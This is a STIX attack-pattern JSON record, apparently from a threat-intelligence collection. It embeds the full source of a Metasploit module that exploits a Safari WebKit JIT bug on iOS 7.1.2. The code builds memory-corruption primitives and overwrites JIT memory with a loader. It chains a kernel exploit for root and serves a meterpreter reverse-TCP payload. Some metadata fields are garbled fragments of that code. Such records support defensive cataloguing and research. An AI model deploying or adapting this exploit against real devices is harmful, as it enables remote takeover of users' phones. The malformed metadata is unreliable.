{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--efff7385-ed9d-4506-8fea-989bca6e2f34",
    "created": "2024-08-14T16:34:07.535781Z",
    "modified": "2024-08-14T16:34:07.535785Z",
    "name": "Safari Webkit JIT Exploit for iOS 7.1.2",
    "description": " This module exploits a JIT optimization bug in Safari Webkit. This allows us to write shellcode to an RWX memory section in JavaScriptCore and execute it. The",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/apple_ios/browser/safari_jit.rb",
            "external_id": "safari_jit.rb"
        },
        {
            "source_name": "IanBeer",
            "external_id": "#CVE-2016-4669"
        },
        {
            "source_name": "WanderingGlitch",
            "external_id": "#CVE-2018-4162"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-4669"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-4162"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/kudima/exploit_playground/tree/master/iPhone3_1_shell"
        },
        {
            "source_name": "reference",
            "url": "https://www.thezdi.com/blog/2018/4/12/inverting-your-assumptions-a-guide-to-jit-comparisons"
        },
        {
            "source_name": "reference",
            "url": "https://bugs.chromium.org/p/project-zero/issues/detail?id=882"
        },
        {
            "source_name": "loader_data=exploit_data(CVE-2016-4669",
            "external_id": "loader)"
        },
        {
            "source_name": "loader_data=exploit_data(CVE-2016-4669",
            "external_id": "macho)"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Post::File\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Safari Webkit JIT Exploit for iOS 7.1.2',\n        'Description' => %q{\n          This module exploits a JIT optimization bug in Safari Webkit. This allows us to\n          write shellcode to an RWX memory section in JavaScriptCore and execute it. The\n          shellcode contains a kernel exploit (CVE-2016-4669) that obtains kernel rw,\n          obtains root and disables code signing. Finally we download and execute the\n          meterpreter payload.\n          This module has been tested against iOS 7.1.2 on an iPhone 4.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'kudima', # ishell\n          'Ian Beer', # CVE-2016-4669\n          'WanderingGlitch', # CVE-2018-4162\n          'timwr', # metasploit integration\n        ],\n        'References' => [\n          ['CVE', '2016-4669'],\n          ['CVE', '2018-4162'],\n          ['URL', 'https://github.com/kudima/exploit_playground/tree/master/iPhone3_1_shell'],\n          ['URL', 'https://www.thezdi.com/blog/2018/4/12/inverting-your-assumptions-a-guide-to-jit-comparisons'],\n          ['URL', 'https://bugs.chromium.org/p/project-zero/issues/detail?id=882'],\n        ],\n        'Arch' => ARCH_ARMLE,\n        'Platform' => 'apple_ios',\n        'DefaultTarget' => 0,\n        'DefaultOptions' => { 'PAYLOAD' => 'apple_ios/armle/meterpreter_reverse_tcp' },\n        'Targets' => [[ 'Automatic', {} ]],\n        'DisclosureDate' => '2016-08-25'\n      )\n    )\n    register_options(\n      [\n        OptPort.new('SRVPORT', [ true, 'The local port to listen on.', 8080 ]),\n        OptString.new('URIPATH', [ true, 'The URI to use for this exploit.', '/' ])\n      ]\n    )\n    register_advanced_options([\n      OptBool.new('DEBUG_EXPLOIT', [false, 'Show debug information during exploitation', false]),\n    ])\n  end\n\n  def exploit_js\n    <<~JS\n      //\n      // Initial notes.\n      //\n      // If we look at publicly available exploits for this kind of\n      // issues [2], [3] on 64-bit systems, they rely on that JavaScriptCore\n      // differently interprets the content of arrays based on\n      // their type, besides object pointers and 64-bit doubles may have\n      // the same representation.\n      //\n      // This is not the case for 32-bit version of JavaScriptCore.\n      // The details are in runtime/JSCJSValue.h. All JSValues are still\n      // 64-bit, but for the cells representing objects\n      // the high 32-bit are always 0xfffffffb (since we only need 32-bit\n      // to represent a pointer), meaning cell is always a NaN in IEEE754\n      // representation used for doubles and it is not possible to confuse\n      // an cell and a IEEE754 encoded double value.\n      //\n      // Another difference is how the cells are represented\n      // in the version of JavaScriptCore by iOS 7.1.2.\n      // The type of the cell object is determined by m_structure member\n      // at offset 0 which is a pointer to Structure object.\n      // On 64-bit systems, at the time [2], [3]\n      // were published, a 32-bit integer value was used as a structure id.\n      // And it was possible to deterministically predict that id for\n      // specific object layout.\n      //\n      // The exploit outline.\n      //\n      // Let's give a high level description of the steps taken by the\n      // exploit to get to arbitrary code execution.\n      //\n      // 1. We use side effect bug to overwrite butterfly header by confusing\n      // Double array with ArrayStorage and obtain out of bound (oob) read/write\n      // into array butterflies allocation area.\n      //\n      // 2. Use oob read/write to build addrOf/materialize object primitives,\n      // by overlapping ArrayStorage length with object pointer part of a cell\n      // stored in Contiguous array.\n      //\n      // 3. Craft a fake Number object in order to leak real object structure\n      // pointer via a runtime function.\n      //\n      // 4. Use leaked structure pointer to build a fake fake object allowing\n      // as read/write access to a Uint32Array object to obtain arbitrary read/write.\n      //\n      // 5. We overwrite rwx memory used for jit code and redirect execution\n      // to that memory using our arbitrary read/write.\n\n      function main(loader, macho) {\n\n        // auxillary arrays to facilitate\n        // 64-bit floats to pointers conversion\n        var ab  = new ArrayBuffer(8)\n        var u32 = new Uint32Array(ab);\n        var f64 = new Float64Array(ab);\n\n        function toF64(hi, lo) {\n          u32[0] = hi;\n          u32[1] = lo;\n          return f64[0];\n        }\n\n        function toHILO(f) {\n          f64[0] = f;\n          return [u32[0], u32[1]]\n        }\n\n        function printF64(f) {\n          var u32 = toHILO(f);\n          return (u32[0].toString(16) + \" \" + u32[1].toString(16));\n        }\n\n        // arr is an object with a butterfly\n        //\n        // cmp is an object we compare with\n        //\n        // v is a value assigned to an indexed property,\n        // gives as ability to change the butterfly\n        function oob_write(arr, cmp, v, i) {\n          arr[0] = 1.1;\n          // place a comparison with an object,\n          // incorrectly modeled as side effects free\n          cmp == 1;\n          // if i less then the butterfly length,\n          // it simply writes the value, otherwise\n          // bails to baseline jit, which is going to\n          // handle the write via a slow path.\n          arr[i] = v;\n          return arr[0];\n        }\n\n        function make_oob_array() {\n\n          var oob_array;\n\n          // allocate an object\n          var arr = {};\n          arr.p = 1.1;\n          // allocate butterfly of size 0x38,\n          // 8 bytes header and 6 elements. To get the size\n          // we create an array and inspect its memory\n          // in jsc command line interpreter.\n          arr[0] = 1.1;\n\n          // toString is triggered during comparison,\n          var x = {toString: function () {\n              // convert the butterfly into an\n              // array storage with two values,\n              // initial 1.1 64-bit at 0 is going to be placed\n              // to m_vector and value at 1000 is placed into\n              // the m_sparceMap\n              arr[1000] = 2.2;\n              // allocate a new butterfly right after\n              // our ArrayStorage. The butterflies are\n              // allocated continuously regardless\n              // of the size. For the array we\n              // get 0x28 bytes, header and 4 elements.\n              oob_array = [1.1];\n              return '1';\n            }\n          };\n\n          // ArrayStorage buttefly--+\n          //                        |\n          //                        V\n          //-8       -4             0             4\n          //  | pub length | length | m_sparceMap |  m_indexBias |\n          //\n          // 8                    0xc        0x10\n          // | m_numValuesInVector | m_padding | m_vector[0]\n          //\n          //0x18         0x20        0x28\n          // | m_vector[1] | m_vector[2] | m_vector[3]  |\n          //\n          //              oob_array butterfly\n          //                       |\n          //                       V\n          //0x30     0x34         0x38   0x40     0x48      0x50\n          // | pub length | length |  el0 |   el1   |   el2   |\n          //\n\n          // We enter the function with arr butterfly\n          // backed up by a regular butterfly, during the side effect\n          // in toString method we turn it into an ArrayStorage,\n          // and allocate a butterfly right after it. So we\n          // hopefully get memory layout as on the diagram above.\n          //\n          // The compiled code for oob_write, being not aware of the\n          // shape change, is going to compare 6 to the ArrayStorage\n          // length (which we set to 1000 in toString) and proceed\n          // to to write at index 6 relative to ArrayStorage butterfly,\n          // overwriting the oob_array butterfly header with 64-bit float\n          // encoded as 0x0000100000001000. Which gives as ability to write\n          // out of bounds of oob_array up to 0x1000 bytes, hence\n          // the name oob_array.\n\n          var o = oob_write(arr, x, toF64(0x1000, 0x1000), 6);\n\n          return oob_array;\n        }\n\n        // returns address of an object\n        function addrOf(o) {\n          // overwrite ArrayStorage public length\n          // with the object pointer\n          oob_array[4] = o;\n          // retrieve the address as ArrayStorage\n          // butterfly public length\n          var r = oobStorage.length;\n          return r;\n        }\n\n        function materialize(addr) {\n          // replace ArrayStorage public length\n          oobStorage.length = addr;\n          // retrieve the placed address\n          // as an object\n          return oob_array[4];\n        }\n\n        function read32(addr) {\n          var lohi = toHILO(rw0Master.rw0_f2);\n          // replace m_buffer with our address\n          rw0Master.rw0_f2 = toF64(lohi[0], addr);\n          var ret = u32rw[0];\n          // restore\n          rw0Master.rw0_f2 = toF64(lohi[0], lohi[1]);\n          return ret;\n        }\n\n        function write32(addr, v) {\n          var lohi = toHILO(rw0Master.rw0_f2);\n          rw0Master.rw0_f2 = toF64(lohi[0], addr);\n          // for some reason if we don't do this\n          // and the value is negative as a signed int ( > 0x80000000)\n          // it takes base from a different place\n          u32rw[0] = v & 0xffffffff;\n          rw0Master.rw0_f2 = toF64(lohi[0], lohi[1]);\n        }\n\n        function testRW32() {\n          var o = [1.1];\n\n          print(\"--------------- testrw32 -------------\");\n          print(\"len: \" + o.length);\n\n          var bfly = read32(addrOf(o)+4);\n          print(\"bfly: \" + bfly.toString(16));\n\n          var len = read32(bfly-8);\n          print(\"bfly len: \" + len.toString(16));\n          write32(bfly - 8, 0x10);\n          var ret = o.length == 0x10;\n          print(\"len: \" + o.length);\n          write32(bfly - 8, 1);\n          print(\"--------------- testrw32 -------------\");\n          return ret;\n        }\n\n        // dump @len dword\n        function dumpAddr(addr, len) {\n          var output = 'addr: ' + addr.toString(16) + \"\\\\n\";\n          for (var i=0; i<len; i++) {\n            output += read32(addr + i*4).toString(16) + \" \";\n            if ((i+1) % 2 == 0) {\n              output += \"\\\\n\";\n            }\n          }\n          return output;\n        }\n\n        // prepare the function we are going to\n        // use to run our macho loader\n        exec_code = \"var o = {};\";\n        for (var i=0; i<200; i++) {\n          exec_code += \"o.p = 1.1;\";\n        }\n        exec_code += \"if (v) alert('exec');\";\n\n        var exec = new Function('v', exec_code);\n\n        // force JavaScriptCore to generate jit code\n        // for the function\n        for (var i=0; i<1000; i++)\n          exec();\n\n        // create an object with a Double array butterfly\n        var arr = {};\n        arr.p = 1.1;\n        arr[0] = 1.1;\n\n        // force DFG optimization for oob_write function,\n        // with a write beyond the allocated storage\n        for (var i=0; i<10000; i++) {\n          oob_write(arr, {}, 1.1, 1);\n        }\n\n        // prepare a double array which we are going to turn\n        // into an ArrayStorage later on.\n        var oobStorage = [];\n        oobStorage[0] = 1.1;\n\n        // create an array with oob read/write\n        // relative to its butterfly\n        var oob_array = make_oob_array();\n        // Allocate an ArrayStorage after oob_array butterfly.\n        oobStorage[1000] = 2.2;\n\n        // convert into Contiguous storage, so we can materialize\n        // objects\n        oob_array[4] = {};\n\n        // allocate two objects with seven inline properties one after another,\n        // for fake object crafting\n        var oo = [];\n        for (var i=0; i<0x10; i++) {\n          o = {p1:1.1, p2:2.2, p3:1.1, p4:1.1, p5:1.1, p6:1.1, p7:toF64(0x4141, i )};\n          oo.push(o);\n        }\n\n        // for some reason if we just do\n        //var structLeaker = {p1:1.1, p2:2.2, p3:1.1, p4:1.1, p5:1.1, p6:1.1, p7:1.1};\n        //var fakeObjStore = {p1:1.1, p2:2.2, p3:1.1, p4:1.1, p5:1.1, p6:1.1, p7:1.1};\n        // the objects just get some random addressed far apart, and we need\n        // them allocated one after another.\n\n        var fakeObjStore = oo.pop();\n        // we are going to leak Structure pointer for this object\n        var structLeaker = oo.pop();\n\n        // eventually we want to use it for read/write into typed array,\n        // and typed array is 0x18 bytes from our experiments.\n        // To cover all 0x18 bytes, we add four out of line properties\n        // to the structure we want to leak.\n        structLeaker.rw0_f1 = 1.1;\n        structLeaker.rw0_f2 = 1.1;\n        structLeaker.rw0_f3 = 1.1;\n        structLeaker.rw0_f4 = 1.1;\n\n        print(\"fakeObjStoreAddr: \" + addrOf(fakeObjStore).toString(16));\n        print(\"structLeaker: \" + addrOf(structLeaker).toString(16));\n\n        var fakeObjStoreAddr = addrOf(fakeObjStore)\n        // m_typeInfo offset within a Structure class is 0x34\n        // m_typeInfo = {m_type = 0x15, m_flags = 0x80, m_flags2 = 0x0}\n        // for Number\n\n        // we want to achieve the following layout for fakeObjStore\n        //\n        // 0        8       0x10      0x18    0x20    0x28    0x30\n        // |  1.1   |   1.1   | 1.1    |  1.1  |  1.1   |  1.1 |\n        //\n        // 0x30              0x34        0x38     0x40\n        // | fakeObjStoreAddr  | 0x00008015 |  1.1    |\n        //\n        // we materialize fakeObjStoreAddr + 0x30 as an object,\n        // As we can see the Structure pointer points back to fakeObjStore,\n        // which is acting as a structure for our object. In that fake\n        // structure object we craft m_typeInfo as if it was a Number object.\n        // At offset +0x34 the Structure objects have m_typeInfo member indicating\n        // the object type.\n        // For number it is m_typeInfo = {m_type = 0x15, m_flags = 0x80, m_flags2 = 0x0}\n        // So we place that value at offset 0x34 relative to the fakeObjStore start.\n        fakeObjStore.p6 = toF64(fakeObjStoreAddr, 0x008015);\n        var fakeNumber = materialize(fakeObjStoreAddr + 0x30);\n\n        // We call a runtime function valueOf on Number, which only verifies\n        // that m_typeInfo field describes a Number object. Then it reads\n        // and returns 64-bit float value at object address + 0x10.\n        //\n        // In our seven properties object, it's\n        // going to be a 64-bit word located right after last property. Since\n        // we have arranged another seven properties object to be placed right\n        // after fakeObjStore, we are going to get first 8 bytes of\n        // that cell object which has the following layout.\n        // 0     4         8\n        // | m_structure | m_butterfly |\n        var val = Number.prototype.valueOf.call(fakeNumber);\n\n        // get lower 32-bit of a 64-bit float, which is a structure pointer.\n        var _7pStructAddr = toHILO(val)[1];\n        print(\"struct addr: \" + _7pStructAddr.toString(16));\n\n        // now we are going to use the structure to craft an object\n        // with properties allowing as read/write access to Uint32Array.\n\n        var aabb = new ArrayBuffer(0x20);\n\n        // Uint32Array is 0x18 bytes,\n        // + 0xc  m_impl\n        // + 0x10 m_storageLength\n        // + 0x14 m_storage\n        var u32rw = new Uint32Array(aabb, 4);\n\n        // Create a fake object with the structure we leaked before.\n        // So we can r/w to Uint32Array via out of line properties.\n        // The ool properties are placed before the butterfly header,\n        // so we point our fake object butterfly to Uint32Array + 0x28,\n        // to cover first 0x20 bytes via four out of line properties we added earlier\n        var objRW0Store = {p1:toF64(_7pStructAddr,  addrOf(u32rw) + 0x28), p2:1.1};\n\n        // materialize whatever we put in the first inline property as an object\n        var rw0Master = materialize(addrOf(objRW0Store) + 8);\n\n        // magic\n        var o = {p1: 1.1, p2: 1.1, p3: 1.1, p4: 1.1};\n        for (var i=0; i<8; i++) {\n          read32(addrOf(o));\n          write32(addrOf(o)+8, 0);\n        }\n\n        //testRW32();\n        // JSFunction->m_executable\n        var m_executable = read32(addrOf(exec)+0xc);\n\n        // m_executable->m_jitCodeForCall\n        var jitCodeForCall = read32(m_executable + 0x14) - 1;\n        print(\"jit code pointer: \" + jitCodeForCall.toString(16));\n\n        // Get JSCell::destroy pointer, and pass it\n        // to the code we are going to execute as an argument\n        var n = new Number(1.1);\n        var struct = read32(addrOf(n));\n        // read methodTable\n        var classInfo = read32(struct + 0x20);\n        // read JSCell::destroy\n        var JSCell_destroy = read32(classInfo + 0x10);\n\n        print(\"JSCell_destroy: \" + JSCell_destroy.toString(16));\n\n        // overwrite jit code of exec function\n        for (var i=0; i<loader.length; i++) {\n          var x = loader[i];\n          write32(jitCodeForCall+i*4, x);\n        }\n\n        // pass JSCell::destroy pointer and\n        // the macho file as arguments to our\n        // macho file loader, so it can get dylib cache slide\n        var nextBuf = read32(addrOf(macho) + 0x14);\n        // we pass parameters to the loader as a list of 32-bit words\n        // places right before the start\n        write32(jitCodeForCall-4, JSCell_destroy);\n        write32(jitCodeForCall-8, nextBuf);\n        print(\"nextBuf: \" + nextBuf.toString(16));\n        // start our macho loader\n        print(\"executing macho...\");\n        exec(true);\n        print(\"exec returned\");\n        return;\n      }\n\n      try {\n        function asciiToUint8Array(str) {\n\n          var len = Math.floor((str.length + 4)/4) * 4;\n          var bytes = new Uint8Array(len);\n\n          for (var i=0; i<str.length; i++) {\n            var code = str.charCodeAt(i);\n            bytes[i] = code & 0xff;\n          }\n\n          return bytes;\n        }\n\n        // loads base64 encoded payload from the server and converts\n        // it into a Uint32Array\n        function loadAsUint32Array(path) {\n          var xhttp = new XMLHttpRequest();\n          xhttp.open(\"GET\", path+\"?cache=\" + new Date().getTime(), false);\n          xhttp.send();\n          var payload = atob(xhttp.response);\n          payload = asciiToUint8Array(payload);\n          return new Uint32Array(payload.buffer);\n        }\n\n        var loader = loadAsUint32Array(\"loader.b64\");\n        var macho = loadAsUint32Array(\"macho.b64\");\n        setTimeout(function() {main(loader, macho);}, 50);\n      } catch (e) {\n        print(e + \"\\\\n\" + e.stack);\n      }\n    JS\n  end\n\n  def on_request_uri(cli, request)\n    if datastore['DEBUG_EXPLOIT'] && request.uri =~ %r{/print$*}\n      print_status(\"[*] #{request.body}\")\n      send_response(cli, '')\n      return\n    end\n\n    print_status(\"Request #{request.uri} from #{request['User-Agent']}\")\n    if request.uri.starts_with? '/loader.b64'\n      loader_data = exploit_data('CVE-2016-4669', 'loader')\n      loader_data = Rex::Text.encode_base64(loader_data)\n      send_response(cli, loader_data, { 'Content-Type' => 'application/octet-stream' })\n      return\n    elsif request.uri.starts_with? '/macho.b64'\n      loader_data = exploit_data('CVE-2016-4669', 'macho')\n      payload_url = \"http://#{Rex::Socket.source_address('1.2.3.4')}:#{srvport}/payload\"\n      payload_url_index = loader_data.index('PAYLOAD_URL_PLACEHOLDER')\n      loader_data[payload_url_index, payload_url.length] = payload_url\n      loader_data = Rex::Text.encode_base64(loader_data)\n      send_response(cli, loader_data, { 'Content-Type' => 'application/octet-stream' })\n      return\n    elsif request.uri.starts_with? '/payload'\n      print_good('Target is vulnerable, sending payload!')\n      send_response(cli, payload.raw, { 'Content-Type' => 'application/octet-stream' })\n      return\n    end\n\n    jscript = exploit_js\n    if datastore['DEBUG_EXPLOIT']\n      debugjs = %^\nprint = function(arg) {\n  var request = new XMLHttpRequest();\n  request.open(\"POST\", \"/print\", false);\n  request.send(\"\" + arg);\n};\n^\n      jscript = \"#{debugjs}#{jscript}\"\n    else\n      jscript.gsub!(%r{//.*$}, '') # strip comments\n      jscript.gsub!(/^\\s*print\\s*\\(.*?\\);\\s*$/, '') # strip print(*);\n    end\n\n    html = <<~HTML\n      <html>\n      <body>\n      <script>\n      #{jscript}\n      </script>\n      </body>\n      </html>\n    HTML\n\n    send_response(cli, html, { 'Content-Type' => 'text/html', 'Cache-Control' => 'no-cache, no-store, must-revalidate', 'Pragma' => 'no-cache', 'Expires' => '0' })\n  end\n\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2016-08-25",
    "x_mitre_platforms": [
        "apple_ios'"
    ]
}